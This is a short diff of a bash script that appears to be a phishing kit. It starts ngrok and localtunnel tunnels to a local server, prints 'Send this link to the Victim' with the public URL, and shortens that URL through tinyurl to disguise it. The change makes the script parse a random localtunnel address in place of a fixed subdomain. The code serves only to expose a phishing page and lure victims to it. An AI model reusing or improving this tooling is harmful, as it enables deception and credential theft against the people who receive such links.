@@ -433,11 +433,13 @@ sleep 2
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel server...\n"
 ./ngrok http 127.0.0.1:5555  > /dev/null 2>&1 &
 sleep 8
-lt --port 5555 --subdomain wmw-$server-com > /dev/null 2>&1 &
-sleep 4
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-"$server"-com.loca.lt"
-short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt`
+lt --port 5555 > link.txt 2>&1 &
+sleep 6
+link=$(grep -o 'https://.*loca.lt' link.txt)
+printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
+short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=$link`
 printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
+rm -f link.txt
 echo ""
 echo ""
 
